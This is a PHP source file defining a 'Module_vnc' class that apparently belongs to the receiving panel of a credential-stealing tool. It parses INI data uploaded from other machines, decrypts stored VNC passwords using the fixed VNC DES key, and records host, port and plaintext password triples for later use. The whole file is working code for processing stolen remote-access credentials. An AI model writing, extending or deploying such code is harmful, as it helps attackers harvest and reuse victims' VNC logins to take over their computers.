<?php
	class Module_vnc extends Module_
	{
		protected function VNCPW_($Encrypted) 
		{
			$Decoded = hex2bin($Encrypted);
			if(!$Decoded)
				return '';
			
			return mcrypt_decrypt(MCRYPT_DES, hex2bin("e84ad660c4721ae0"), $Decoded, MCRYPT_MODE_ECB);
		}
	
		protected function Process($Data)
		{
			$INI_ = parse_ini($Data);
			if(!$INI_)
				return;
			
			foreach($INI_ as $Element)
			{
				$Host = Assign_($Element['host']);
				if(strlen($Host))
				{
					$Pass = $this->VNCPW_(Assign_($Element['password']));
					if(strlen($Pass))
					{					
						if(isset($Element['port']))
						{
							$Host .= ":" . Assign_($Element['port']);
						}
						
						$this->insert_other($Host. ":" . $Pass);
					}
				}
				else
				{
					$Host = Assign_($Element['Host']);
					if(strlen($Host))
					{
						$Pass = $this->VNCPW_(Assign_($Element['Password']));
						if(strlen($Pass))
						{					
							if(isset($Element['Port']))
							{
								$Host .= ":" . Assign_($Element['Port']);
							}
							
							$this->insert_other($Host. ":" . $Pass);
						}
					}
				}
			}
			
			$INI_ = NULL;
		}

		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
			case 0:
				$this->Process($Data);
				break;
			default:
				return FALSE;
			}

			return TRUE;
		}
	}

